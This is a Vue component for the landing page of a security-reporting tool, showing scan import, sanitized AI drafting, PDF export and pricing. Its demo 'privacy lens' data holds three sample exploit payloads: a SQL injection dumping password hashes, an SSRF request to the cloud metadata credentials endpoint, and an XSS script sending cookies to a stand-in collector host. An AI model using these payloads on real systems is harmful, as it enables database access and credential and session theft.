<template>
  <PublicLayout>
    <!-- 1. Monumental Asymmetric Typographic Hero -->
    <section class="border-b border-white/[0.1]">
      <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 pt-16 pb-12 lg:pt-24 lg:pb-16 space-y-14 lg:space-y-20">
        <div class="space-y-6 max-w-5xl">
          <span class="font-mono text-[11px] uppercase tracking-[0.14em] text-[#8A8D96] block">
            Automated Security Reporting
          </span>
          <h1 class="font-display text-5xl sm:text-6xl lg:text-[4.6rem] font-bold tracking-[-0.045em] text-[#F5F5F3] leading-[0.98]">
            Security reports,<br />
            stripped of <span class="font-serif italic font-normal text-white">noise.</span>
          </h1>
        </div>

        <!-- 3 / 6 / 3 Lower Editorial Band -->
        <div class="border-t border-white/[0.1] pt-8 grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          <ul class="lg:col-span-3 font-mono text-[11px] uppercase tracking-[0.1em] text-[#8A8D96] space-y-2">
            <li class="flex items-center gap-2">
              <span class="text-[#F5F5F3]">01</span>
              <span>Local CLI</span>
            </li>
            <li class="flex items-center gap-2">
              <span class="text-[#F5F5F3]">02</span>
              <span>Private AI</span>
            </li>
            <li class="flex items-center gap-2">
              <span class="text-[#F5F5F3]">03</span>
              <span>White-Label PDF</span>
            </li>
          </ul>

          <p class="lg:col-span-6 text-base text-[#C4C6CC] leading-relaxed max-w-xl">
            Scans run quietly on your workstation. Exploit payloads never cross external API boundaries. Executives receive measured, plain-English deliverables they can act on immediately.
          </p>

          <div class="lg:col-span-3 flex flex-col items-start lg:items-end gap-3 text-xs font-medium">
            <router-link
              :to="isAuthenticated ? (isSuperadmin ? '/app/admin' : '/app/dashboard') : '/app/register'"
              class="btn-platinum w-full lg:w-auto px-5 py-3 justify-between gap-4"
            >
              <span>{{
                isAuthenticated
                  ? isSuperadmin
                    ? 'Open Admin Console'
                    : 'Open Dashboard'
                  : 'Create free workspace'
              }}</span>
              <ArrowRight class="h-3.5 w-3.5" aria-hidden="true" />
            </router-link>

            <a
              href="#privacy-preview"
              class="text-[#8A8D96] hover:text-[#F5F5F3] hover:underline underline-offset-4 transition-colors inline-flex items-center gap-1.5 py-1"
            >
              <span>Inspect privacy lens</span>
              <ArrowDown class="h-3.5 w-3.5" aria-hidden="true" />
            </a>
          </div>
        </div>
      </div>
    </section>

    <!-- 2. Full-Width Interactive Editorial Sequence (01 / 02 / 03 + A4 Specimen) -->
    <section class="border-b border-white/[0.1]">
      <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-16 lg:py-20 space-y-10">
        <!-- Ruled Horizontal Index Tabs -->
        <div class="flex flex-col sm:flex-row sm:items-end justify-between gap-4 border-b border-white/[0.1] pb-4">
          <span class="font-mono text-[11px] uppercase tracking-[0.14em] text-[#8A8D96]">
            Workflow Sequence
          </span>

          <div class="flex flex-wrap items-center gap-6 text-xs font-medium" role="tablist" aria-label="Workflow sequence">
            <button
              v-for="stage in workflowStages"
              :key="stage.key"
              type="button"
              role="tab"
              :aria-selected="activeStageKey === stage.key"
              @click="activeStageKey = stage.key"
              :class="[
                'pb-1 border-b transition-colors inline-flex items-center gap-2',
                activeStageKey === stage.key
                  ? 'border-[#F5F5F3] text-[#F5F5F3] font-semibold'
                  : 'border-transparent text-[#8A8D96] hover:text-[#F5F5F3]',
              ]"
            >
              <span class="font-mono text-[11px]">{{ stage.index }}</span>
              <span>{{ stage.label }}</span>
            </button>
          </div>
        </div>

        <!-- Magazine Spread Specimen -->
        <div class="grid grid-cols-1 lg:grid-cols-12 gap-10 items-start">
          <div class="lg:col-span-5 space-y-4">
            <div class="font-mono text-xs text-[#8A8D96]">
              Stage {{ activeStage.index }} — {{ activeStage.label }}
            </div>
            <h2 class="font-display text-2xl sm:text-3xl font-bold tracking-tight text-[#F5F5F3] leading-tight">
              {{ activeStage.title }}
            </h2>
            <p class="text-sm text-[#A1A4AD] leading-relaxed">
              {{ activeStage.summary }}
            </p>
            <div class="pt-4 border-t border-white/[0.08] font-mono text-[11px] text-[#8A8D96]">
              {{ activeStage.footnote }}
            </div>
          </div>

          <div class="lg:col-span-7">
            <!-- Special Editorial A4 Cover Specimen on Stage 03 -->
            <div
              v-if="activeStageKey === 'export'"
              class="border border-white/[0.14] bg-[#08080B] p-8 sm:p-10 space-y-8"
            >
              <div class="flex items-start justify-between gap-4 border-b border-white/[0.1] pb-6">
                <div>
                  <div class="font-mono text-[10px] uppercase tracking-[0.16em] text-[#8A8D96]">
                    Confidential Assessment Deliverable
                  </div>
                  <div class="font-display text-sm font-semibold text-[#F5F5F3] mt-1">
                    Northstar Security
                  </div>
                </div>
                <span class="font-mono text-[11px] px-2 py-0.5 border border-white/[0.2] text-[#F5F5F3]">
                  A4 PRINT READY
                </span>
              </div>

              <div class="space-y-2 py-2">
                <div class="font-mono text-xs text-[#8A8D96]">Prepared for Acme Corp</div>
                <div class="font-serif italic text-3xl sm:text-4xl text-[#F5F5F3] leading-tight">
                  Annual Application Security Review
                </div>
              </div>

              <dl class="grid grid-cols-3 border-t border-white/[0.1] pt-5 text-xs font-mono tabular-nums">
                <div class="flex items-center gap-2">
                  <span class="h-1.5 w-1.5 rounded-full bg-red-500" aria-hidden="true" />
                  <span class="text-[#8A8D96]">CRITICAL:</span>
                  <span class="text-[#F5F5F3] font-semibold">02</span>
                </div>
                <div class="flex items-center gap-2">
                  <span class="h-1.5 w-1.5 rounded-full bg-orange-400" aria-hidden="true" />
                  <span class="text-[#8A8D96]">HIGH:</span>
                  <span class="text-[#F5F5F3] font-semibold">04</span>
                </div>
                <div class="flex items-center gap-2">
                  <span class="h-1.5 w-1.5 rounded-full bg-amber-400" aria-hidden="true" />
                  <span class="text-[#8A8D96]">MEDIUM:</span>
                  <span class="text-[#F5F5F3] font-semibold">08</span>
                </div>
              </dl>
            </div>

            <!-- Structured Ruled Ledger for Import & Draft Stages -->
            <ul v-else class="border-y border-white/[0.12] divide-y divide-white/[0.08]">
              <li
                v-for="row in activeStage.rows"
                :key="row.primary"
                class="py-4 flex items-center justify-between gap-4"
              >
                <div class="min-w-0 space-y-1">
                  <div class="text-sm font-medium text-[#F5F5F3]">{{ row.primary }}</div>
                  <div class="font-mono text-xs text-[#8A8D96]">{{ row.secondary }}</div>
                </div>
                <span class="inline-flex items-center gap-2 font-mono text-xs text-[#F5F5F3] shrink-0">
                  <span :class="['h-1.5 w-1.5 rounded-full', dotToneClass(row.tone)]" aria-hidden="true" />
                  <span>{{ row.badge }}</span>
                </span>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </section>

    <!-- 3. Visual Climax: Optical Declassification Lens (UC-01) -->
    <section id="privacy-preview" class="border-b border-white/[0.1] scroll-mt-16">
      <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-20 lg:py-24 space-y-8">
        <div class="flex flex-col md:flex-row md:items-end justify-between gap-4">
          <div class="space-y-2 max-w-2xl">
            <span class="font-mono text-[11px] uppercase tracking-[0.14em] text-[#8A8D96] block">
              Fig. 01 — Privacy Boundary
            </span>
            <h2 class="font-display text-3xl sm:text-4xl font-bold tracking-tight text-[#F5F5F3]">
              The optical separation between proof and prose.
            </h2>
          </div>

          <div class="flex items-center gap-3 flex-wrap">
            <label for="sandbox-sample" class="sr-only">Select sample finding</label>
            <select
              id="sandbox-sample"
              v-model="selectedSampleKey"
              class="input-glass px-3 py-2 text-xs"
            >
              <option value="sqli">SQL Injection (CWE-89)</option>
              <option value="ssrf">Server-Side Request Forgery (CWE-918)</option>
              <option value="xss">Cross-Site Scripting (CWE-79)</option>
            </select>
          </div>
        </div>

        <!-- High-Contrast Editorial Privacy Spread -->
        <div class="border border-white/[0.14] bg-[#08080B]">
          <div class="px-6 py-3.5 border-b border-white/[0.1] flex flex-wrap items-center justify-between gap-4">
            <div class="flex items-center gap-4">
              <span class="font-mono text-xs text-[#8A8D96] uppercase tracking-wider">Optical Lens</span>
              <div class="inline-flex border border-white/[0.14]">
                <button
                  type="button"
                  @click="sanitizerActive = true"
                  :class="[
                    'px-3 py-1 text-xs font-medium transition-colors',
                    sanitizerActive ? 'bg-[#F5F5F3] text-[#050507] font-semibold' : 'text-[#8A8D96] hover:text-white',
                  ]"
                >
                  Shielded
                </button>
                <button
                  type="button"
                  @click="sanitizerActive = false"
                  :class="[
                    'px-3 py-1 text-xs font-medium transition-colors border-l border-white/[0.14]',
                    !sanitizerActive ? 'bg-red-500/20 text-red-200 font-semibold' : 'text-[#8A8D96] hover:text-white',
                  ]"
                >
                  Unfiltered
                </button>
              </div>
            </div>

            <span class="font-mono text-xs text-[#8A8D96] tabular-nums">
              AI Payload: {{ currentSample.tokenEstimate }} tokens
            </span>
          </div>

          <div class="grid grid-cols-1 lg:grid-cols-2 divide-y lg:divide-y-0 lg:divide-x divide-white/[0.1]">
            <!-- Left Pane: Functional Optical Glass Shutter Directly Over Sensitive Proof -->
            <div class="relative p-6 sm:p-8 space-y-5 min-h-[260px] overflow-hidden">
              <div class="flex items-center justify-between text-xs">
                <span class="font-mono uppercase tracking-wider text-[#F5F5F3]">01 / Sensitive Record</span>
                <span class="font-mono text-[11px] text-[#8A8D96]">Local Storage</span>
              </div>

              <dl class="divide-y divide-white/[0.08] border-t border-white/[0.08] text-xs font-mono">
                <div class="py-3 flex justify-between gap-4">
                  <dt class="text-[#8A8D96] font-sans">Host</dt>
                  <dd class="text-[#F5F5F3]">{{ currentSample.rawHost }}:{{ currentSample.rawPort }}</dd>
                </div>
                <div class="py-3 flex justify-between gap-4">
                  <dt class="text-[#8A8D96] font-sans">Endpoint</dt>
                  <dd class="text-[#F5F5F3]">{{ currentSample.rawEndpoint }}</dd>
                </div>
                <div class="pt-3 space-y-1.5">
                  <dt class="text-[#8A8D96] font-sans">Exploit Payload</dt>
                  <dd class="text-red-300 break-all leading-relaxed">{{ currentSample.rawPoc }}</dd>
                </div>
              </dl>

              <Transition name="vf-fade">
                <div
                  v-if="sanitizerActive"
                  class="vf-optical-lens absolute inset-x-4 bottom-4 top-14 flex flex-col items-center justify-center p-6 text-center gap-4"
                >
                  <div class="space-y-1.5 max-w-xs">
                    <span class="inline-flex items-center gap-1.5 font-mono text-[11px] text-emerald-400">
                      <span class="h-1.5 w-1.5 rounded-full bg-emerald-400" aria-hidden="true" />
                      <span>OPTICAL PRIVACY LENS ACTIVE</span>
                    </span>
                    <p class="text-xs text-[#E4E4E7] leading-relaxed">
                      Hostnames, URLs, and raw client proof remain obscured inside your local vault.
                    </p>
                  </div>
                  <button
                    type="button"
                    @click="sanitizerActive = false"
                    class="px-3.5 py-1.5 rounded-none border border-white/[0.24] bg-[#050507]/85 text-xs font-medium text-[#F5F5F3] hover:bg-[#F5F5F3] hover:text-[#050507] transition-colors"
                  >
                    Lift lens to inspect exposure
                  </button>
                </div>
              </Transition>
            </div>

            <!-- Right Pane: Sanitized Editorial Prose -->
            <div class="p-6 sm:p-8 flex flex-col justify-between gap-6">
              <div class="space-y-4">
                <div class="flex items-center justify-between text-xs">
                  <span class="font-mono uppercase tracking-wider text-[#F5F5F3]">02 / Executive Narrative</span>
                  <span :class="['font-mono text-[11px]', sanitizerActive ? 'text-emerald-400' : 'text-red-400']">
                    {{ sanitizerActive ? 'Metadata only' : 'Unprotected' }}
                  </span>
                </div>

                <div class="border-t border-white/[0.08] pt-4 space-y-3">
                  <div class="font-mono text-xs text-[#8A8D96]">
                    {{ currentSample.title }} · {{ currentSample.cwe }} · CVSS {{ currentSample.cvss.toFixed(1) }}
                  </div>

                  <p v-if="sanitizerActive" class="text-base text-[#F5F5F3] leading-7 max-w-prose">
                    {{ currentSample.aiPreview }}
                  </p>
                  <p v-else class="text-sm text-red-200 leading-relaxed max-w-prose">
                    Caution: with the optical shield disabled, target hosts and exploit payloads are transmitted verbatim outside your boundary. Enable Shielded mode before drafting reports.
                  </p>
                </div>
              </div>

              <div class="pt-4 border-t border-white/[0.08] font-mono text-[11px] text-[#8A8D96]">
                {{ sanitizerActive ? 'Ready for human editorial review' : 'Action recommended: Re-enable shield' }}
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- 4. Monograph Finding Reader (Interactive Sample Triage) -->
    <section class="border-b border-white/[0.1]">
      <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-16 lg:py-20 space-y-8">
        <div class="flex flex-col sm:flex-row sm:items-end justify-between gap-4 border-b border-white/[0.1] pb-5">
          <div class="space-y-1">
            <span class="font-mono text-[11px] uppercase tracking-[0.14em] text-[#8A8D96] block">
              Monograph Reader
            </span>
            <h2 class="font-display text-2xl sm:text-3xl font-bold tracking-tight text-[#F5F5F3]">
              Findings written for humans to read.
            </h2>
          </div>
          <router-link to="/solutions" class="text-xs font-medium text-[#F5F5F3] underline underline-offset-4 hover:text-zinc-300">
            Open interactive catalog →
          </router-link>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-12 gap-10">
          <!-- Left Narrow Mono Index -->
          <div class="lg:col-span-4 border-t border-white/[0.1] divide-y divide-white/[0.08]">
            <button
              v-for="item in sampleFindings"
              :key="item.id"
              type="button"
              @click="selectedFindingId = item.id"
              :class="[
                'w-full py-3.5 pr-3 text-left transition-colors flex items-baseline justify-between gap-3',
                selectedFinding.id === item.id
                  ? 'text-[#F5F5F3]'
                  : 'text-[#8A8D96] hover:text-[#F5F5F3]',
              ]"
            >
              <div class="min-w-0 flex items-baseline gap-2.5">
                <span class="font-mono text-[11px] shrink-0">{{ item.id }}</span>
                <span :class="['text-xs truncate', selectedFinding.id === item.id ? 'font-semibold underline underline-offset-4' : '']">
                  {{ item.title }}
                </span>
              </div>
              <span class="font-mono text-xs tabular-nums shrink-0 inline-flex items-center gap-1.5">
                <span :class="['h-1.5 w-1.5 rounded-full', severityDotClass(item.severity)]" aria-hidden="true" />
                <span>{{ item.cvss.toFixed(1) }}</span>
              </span>
            </button>
          </div>

          <!-- Right Serene Reading Sheet with Oversized CVSS Numeral -->
          <div class="lg:col-span-8 lg:pl-8 lg:border-l border-white/[0.1] space-y-6">
            <div class="flex flex-col sm:flex-row sm:items-start justify-between gap-6 border-b border-white/[0.1] pb-6">
              <div class="space-y-3">
                <h3 class="font-display text-2xl sm:text-3xl font-bold tracking-tight text-[#F5F5F3] leading-tight">
                  {{ selectedFinding.title }}
                </h3>
                <div class="flex flex-wrap items-center gap-3 font-mono text-xs text-[#8A8D96]">
                  <span>{{ selectedFinding.id }}</span>
                  <span>·</span>
                  <span>{{ selectedFinding.cwe }}</span>
                  <span>·</span>
                  <span>{{ selectedFinding.host }}</span>
                  <span>·</span>
                  <span>{{ selectedFinding.endpoint }}</span>
                  <span>·</span>
                  <span>{{ selectedFinding.scanner }}</span>
                </div>
              </div>

              <!-- Oversized Tabular Score Anchor -->
              <div class="shrink-0 sm:text-right">
                <div class="font-display text-5xl font-bold tracking-tighter text-[#F5F5F3] tabular-nums leading-none">
                  {{ selectedFinding.cvss.toFixed(1) }}
                </div>
                <div class="mt-2 inline-flex items-center gap-1.5 font-mono text-[11px] uppercase tracking-wider text-[#8A8D96]">
                  <span :class="['h-1.5 w-1.5 rounded-full', severityDotClass(selectedFinding.severity)]" aria-hidden="true" />
                  <span>{{ selectedFinding.severity }}</span>
                </div>
              </div>
            </div>

            <div class="space-y-5 text-base leading-7 text-[#D4D4D8] max-w-2xl">
              <div>
                <h4 class="font-mono text-[11px] uppercase tracking-[0.12em] text-[#8A8D96] mb-1.5">Overview</h4>
                <p>{{ selectedFinding.description }}</p>
              </div>
              <div>
                <h4 class="font-mono text-[11px] uppercase tracking-[0.12em] text-[#8A8D96] mb-1.5">Recommended Fix</h4>
                <p>{{ selectedFinding.remediation }}</p>
              </div>
            </div>

            <div class="pt-4 border-t border-white/[0.08] flex flex-wrap items-center justify-between gap-4">
              <span class="font-mono text-xs" :class="isExcluded(selectedFinding.id) ? 'text-[#8A8D96]' : 'text-emerald-400'">
                {{ isExcluded(selectedFinding.id) ? 'Status: Excluded from final monograph' : 'Status: Included in final monograph' }}
              </span>
              <div class="flex items-center gap-3">
                <button
                  type="button"
                  @click="toggleExcluded(selectedFinding)"
                  class="btn-glass px-3.5 py-1.5 text-xs"
                >
                  {{ isExcluded(selectedFinding.id) ? 'Restore to report' : 'Exclude from report' }}
                </button>
                <router-link :to="`/solutions/${selectedFinding.id}`" class="btn-platinum px-3.5 py-1.5 text-xs">
                  Inspect CVSS →
                </router-link>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- 5. Swiss Ruled Pricing Table -->
    <section class="border-b border-white/[0.1]">
      <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-16 lg:py-20 space-y-10">
        <div class="flex flex-col sm:flex-row sm:items-end justify-between gap-4">
          <h2 class="font-display text-2xl sm:text-3xl font-bold tracking-tight text-[#F5F5F3]">
            Licensing &amp; monthly quotas
          </h2>
          <router-link to="/contact" class="text-xs font-medium text-[#F5F5F3] underline underline-offset-4">
            Calculate monthly time savings →
          </router-link>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-3 border-y border-white/[0.12] divide-y md:divide-y-0 md:divide-x divide-white/[0.12]">
          <div
            v-for="tier in pricingTiers"
            :key="tier.id"
            class="py-8 md:px-7 first:md:pl-0 last:md:pr-0 flex flex-col justify-between gap-8"
          >
            <div class="space-y-4">
              <div class="flex items-baseline justify-between gap-2">
                <h3 class="font-display text-lg font-bold text-[#F5F5F3]">{{ tier.name }}</h3>
                <span v-if="tier.recommended" class="font-mono text-[11px] text-[#F5F5F3]">* Recommended</span>
              </div>
              <p class="text-xs text-[#8A8D96] leading-relaxed">{{ tier.summary }}</p>

              <div class="pt-3 border-t border-white/[0.08]">
                <div class="font-display text-3xl font-bold text-[#F5F5F3] tabular-nums">{{ tier.price }}</div>
                <div class="font-mono text-[11px] text-[#8A8D96] mt-1">{{ tier.cadence }} · {{ tier.quota }}</div>
              </div>

              <ul class="space-y-2 text-xs text-[#D4D4D8]">
                <li v-for="feat in tier.features" :key="feat">— {{ feat }}</li>
              </ul>
            </div>

            <router-link
              :to="tier.ctaTo"
              :class="[
                'w-full py-2.5 text-xs font-semibold text-center',
                tier.recommended ? 'btn-platinum' : 'btn-glass',
              ]"
            >
              {{ tier.ctaLabel }}
            </router-link>
          </div>
        </div>
      </div>
    </section>

    <!-- 6. Dramatic Oversized Typographic Closing Link -->
    <section class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-20 lg:py-24 w-full">
      <router-link
        :to="isAuthenticated ? (isSuperadmin ? '/app/admin' : '/app/dashboard') : '/app/register'"
        class="group block space-y-3"
      >
        <span class="font-mono text-[11px] uppercase tracking-[0.14em] text-[#8A8D96] block">
          Begin
        </span>
        <div class="font-display text-3xl sm:text-5xl font-bold tracking-[-0.03em] text-[#F5F5F3] group-hover:text-white flex items-center justify-between gap-4">
          <span class="group-hover:underline decoration-1 underline-offset-8">
            {{
              isAuthenticated
                ? isSuperadmin
                  ? 'Open admin console'
                  : 'Open workspace dashboard'
                : 'Start writing clearer reports'
            }}
          </span>
          <ArrowRight class="h-7 w-7 sm:h-9 sm:w-9 shrink-0 transition-transform group-hover:translate-x-1.5" aria-hidden="true" />
        </div>
      </router-link>
    </section>
  </PublicLayout>
</template>

<script setup lang="ts">
import { computed, reactive, ref } from 'vue'
import { ArrowDown, ArrowRight } from 'lucide-vue-next'
import PublicLayout from '@/components/layout/PublicLayout.vue'
import { mockFindings, type MockFinding } from '@/services/mockData'
import { session } from '@/stores/session'
import { toast } from '@/stores/toast'

const isAuthenticated = session.isAuthenticated
const isSuperadmin = session.isSuperadmin
const SCRIPT_CLOSE = '</' + 'script>'

type WorkflowStageKey = 'import' | 'draft' | 'export'
type PrivacySampleKey = 'sqli' | 'ssrf' | 'xss'

const activeStageKey = ref<WorkflowStageKey>('import')
const sanitizerActive = ref(true)
const selectedSampleKey = ref<PrivacySampleKey>('sqli')

const workflowStages: Array<{
  key: WorkflowStageKey
  index: string
  label: string
  title: string
  summary: string
  footnote: string
  rows: Array<{
    primary: string
    secondary: string
    badge: string
    tone: 'critical' | 'high' | 'medium' | 'verified' | 'neutral'
  }>
}> = [
  {
    key: 'import',
    index: '01',
    label: 'Import Scans',
    title: 'Verify authorized targets on arrival',
    summary:
      'Upload Nmap XML or Nuclei JSONL files from your local workstation. Out-of-scope hosts are set aside automatically before reporting begins.',
    footnote: 'Authorized targets checked automatically · Out-of-scope entries held for review',
    rows: [
      {
        primary: 'SQL Injection in User Authentication Route',
        secondary: 'app.acme-corp.com · CWE-89',
        badge: 'Critical 9.8',
        tone: 'critical',
      },
      {
        primary: 'Missing Authorization on Invoice Export',
        secondary: 'billing.acme-corp.com · CWE-639',
        badge: 'High 8.2',
        tone: 'high',
      },
      {
        primary: 'Stored Cross-Site Scripting in Feedback Notes',
        secondary: 'feedback.acme-corp.com · CWE-79',
        badge: 'Medium 6.1',
        tone: 'medium',
      },
    ],
  },
  {
    key: 'draft',
    index: '02',
    label: 'Draft Privately',
    title: 'Generate clear language from sanitized metadata',
    summary:
      'Raw hosts, endpoints, and exploit proof stay encrypted in your workspace. Only issue names, CWE categories, and CVSS scores inform the draft.',
    footnote: '48-token sanitized payload · Human approval required before export',
    rows: [
      {
        primary: 'Title, CWE classification & CVSS risk score',
        secondary: 'Sent to narrative assistant for structured phrasing',
        badge: 'Sanitized',
        tone: 'verified',
      },
      {
        primary: 'Target hosts, internal URLs & PoC payloads',
        secondary: 'Retained inside encrypted workspace storage only',
        badge: 'Redacted',
        tone: 'neutral',
      },
      {
        primary: 'Editable Executive Summary & Fix Guidance',
        secondary: 'Falls back to CWE guidance templates whenever offline',
        badge: 'Team Review',
        tone: 'neutral',
      },
    ],
  },
  {
    key: 'export',
    index: '03',
    label: 'Export Dossier',
    title: 'Deliver white-label A4 reports to stakeholders',
    summary:
      'Compile approved findings, risk breakdowns, and confidentiality notices into print-ready PDF deliverables styled for your organization.',
    footnote: 'Custom logo & brand palette · Versioned PDF archive',
    rows: [],
  },
]

const activeStage = computed(
  () => workflowStages.find((s) => s.key === activeStageKey.value) ?? workflowStages[0]
)

const privacySamples: Record<
  PrivacySampleKey,
  {
    title: string
    rawHost: string
    rawPort: number
    rawEndpoint: string
    rawPoc: string
    cwe: string
    cvss: number
    tokenEstimate: number
    aiPreview: string
  }
> = {
  sqli: {
    title: 'SQL Injection in User Authentication Route',
    rawHost: 'app.acme-corp.com',
    rawPort: 443,
    rawEndpoint: '/api/v1/auth/login',
    rawPoc: "admin' UNION SELECT id, password_hash, role FROM users--",
    cwe: 'CWE-89',
    cvss: 9.8,
    tokenEstimate: 48,
    aiPreview:
      'A critical SQL injection flaw (CWE-89, CVSS 9.8) was identified in the primary authentication route. Unparameterized query construction could permit unauthorized database access. Recommended priority: adopt parameterized statements.',
  },
  ssrf: {
    title: 'Server-Side Request Forgery via Media Importer',
    rawHost: 'api.acme-corp.com',
    rawPort: 8080,
    rawEndpoint: '/v1/media/import-url',
    rawPoc: 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    cwe: 'CWE-918',
    cvss: 8.6,
    tokenEstimate: 44,
    aiPreview:
      'A high-severity request forgery issue (CWE-918, CVSS 8.6) allows crafted import requests to reach internal network endpoints. Recommended priority: validate resolved destination IPs and restrict private address ranges.',
  },
  xss: {
    title: 'Stored Cross-Site Scripting in Client Feedback',
    rawHost: 'feedback.acme-corp.com',
    rawPort: 443,
    rawEndpoint: '/feedback/submit',
    rawPoc: `<script>fetch('https://collector.example.test/?c='+document.cookie)${SCRIPT_CLOSE}`,
    cwe: 'CWE-79',
    cvss: 6.1,
    tokenEstimate: 41,
    aiPreview:
      'A medium-severity stored script injection flaw (CWE-79, CVSS 6.1) affects reviewer note rendering. Recommended priority: apply strict contextual output encoding and tighten Content-Security-Policy rules.',
  },
}

const currentSample = computed(() => privacySamples[selectedSampleKey.value])

const pricingTiers = [
  {
    id: 'free',
    name: 'Free',
    summary: 'Evaluate the complete reporting workflow with your team.',
    price: 'Rp 0',
    cadence: 'per month',
    quota: '3 PDF exports per month',
    features: [
      'Up to 50 findings per scan upload',
      'Automatic scope and CVSS v3.1 scoring',
      'Preview watermark on exported PDFs',
    ],
    ctaLabel: 'Start for free',
    ctaTo: '/app/register',
    recommended: false,
  },
  {
    id: 'pro',
    name: 'Pro',
    summary: 'Clean, branded client deliverables for active security teams.',
    price: 'Rp 750,000',
    cadence: 'per month',
    quota: '30 PDF exports per month',
    features: [
      'White-label branding, logo & NDA cover',
      'Team role permissions (Manager, Pentester, Viewer)',
      'Online subscription checkout & invoice log',
    ],
    ctaLabel: 'Preview upgrade',
    ctaTo: '/contact',
    recommended: true,
  },
  {
    id: 'enterprise',
    name: 'Enterprise',
    summary: 'Dedicated deployment and unlimited workspaces for larger firms.',
    price: 'Custom',
    cadence: 'per year',
    quota: 'Unlimited workspaces & reports',
    features: [
      'Self-hosted private deployment option',
      'Dedicated audit retention & SSO readiness',
      'Priority engineering onboarding',
    ],
    ctaLabel: 'Contact sales',
    ctaTo: '/contact',
    recommended: false,
  },
]

const sampleFindings = mockFindings.slice(0, 5)
const selectedFindingId = ref<string>(sampleFindings[0]?.id ?? 'VF-001')
const excludedIds = reactive<Record<string, boolean>>({})

const selectedFinding = computed<MockFinding>(
  () => sampleFindings.find((f) => f.id === selectedFindingId.value) ?? sampleFindings[0]
)

const isExcluded = (id: string) => Boolean(excludedIds[id])

const toggleExcluded = (finding: MockFinding) => {
  if (excludedIds[finding.id]) {
    delete excludedIds[finding.id]
    toast.info(`${finding.id} restored to the sample report.`)
  } else {
    excludedIds[finding.id] = true
    toast.success(`${finding.id} excluded from the sample report.`)
  }
}

const severityDotClass = (severity: string) => {
  switch (severity.toUpperCase()) {
    case 'CRITICAL':
      return 'bg-red-500'
    case 'HIGH':
      return 'bg-orange-400'
    case 'MEDIUM':
      return 'bg-amber-400'
    default:
      return 'bg-zinc-400'
  }
}

const dotToneClass = (tone: string) => {
  switch (tone) {
    case 'critical':
      return 'bg-red-500'
    case 'high':
      return 'bg-orange-400'
    case 'medium':
      return 'bg-amber-400'
    case 'verified':
      return 'bg-emerald-400'
    default:
      return 'bg-zinc-400'
  }
}
</script>
